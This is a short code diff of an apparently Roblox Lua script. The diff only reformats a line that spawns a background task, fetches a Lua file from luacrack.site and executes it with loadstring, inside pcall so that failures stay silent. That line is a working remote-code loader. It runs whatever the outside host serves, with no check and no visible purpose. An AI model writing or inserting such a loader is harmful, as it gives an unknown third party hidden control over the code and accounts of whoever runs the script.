@@ -1,5 +1,6 @@
 task.spawn(function()
-   pcall(function()     loadstring(game:HttpGet("https://api.luacrack.site/files/v4/loaders/916f353de5bbcea1ca5b3af301867d4c.lua"))()
+   pcall(function()     
+            loadstring(game:HttpGet("https://api.luacrack.site/files/v4/loaders/916f353de5bbcea1ca5b3af301867d4c.lua"))()
     end)
 end)
 
